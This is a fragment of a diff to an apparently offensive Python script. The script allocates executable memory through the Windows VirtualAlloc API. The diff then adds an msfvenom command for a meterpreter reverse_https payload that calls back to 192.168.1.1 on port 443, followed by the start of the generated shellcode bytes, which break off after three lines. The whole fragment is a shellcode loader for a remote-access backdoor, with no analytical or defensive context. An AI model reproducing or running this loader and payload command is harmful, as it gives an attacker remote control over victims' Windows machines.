@@ -8,6 +8,7 @@ time.sleep(1)
 kernel32.VirtualAlloc.restype = ctypes.c_void_p
 ptr = kernel32.VirtualAlloc(None, 0x2000, 0x3000, 0x40)
 
+#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 prependmigrate=true enablestageencoding=true handlersslcert=justice.pem -f python
 buf =  b""
 buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
 buf += b"\x50\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48\x8b"
